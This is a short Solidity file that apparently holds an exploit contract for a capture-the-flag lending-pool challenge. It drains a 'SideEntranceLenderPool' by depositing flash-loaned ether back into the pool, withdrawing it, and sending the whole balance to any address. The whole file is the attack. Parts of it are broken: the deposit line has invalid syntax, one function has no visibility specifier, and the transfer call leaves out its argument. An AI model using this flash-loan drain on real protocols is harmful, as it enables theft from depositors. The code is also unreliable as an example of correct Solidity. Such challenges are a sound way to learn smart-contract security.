// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "../interfaces/IFlashLoanEtherReceiver.sol";

contract Attack is IFlashLoanEtherReceiver{

    SideEntranceLenderPool pool;
    constructor(address _poolAddress){
        pool = SideEntranceLenderPool(_poolAddress);
    }

    function execute() external  payable {
        pool.deposit(){value:msg.value}();
    }

    function init() external {
        pool.flashloan(1000e18);
    }

    function withdrawAll(){
        pool.withdraw();
    }

    function transfer(address to ) external {
        to.call{value: address(this).balance}();
    } 

    receive() external payable { }
}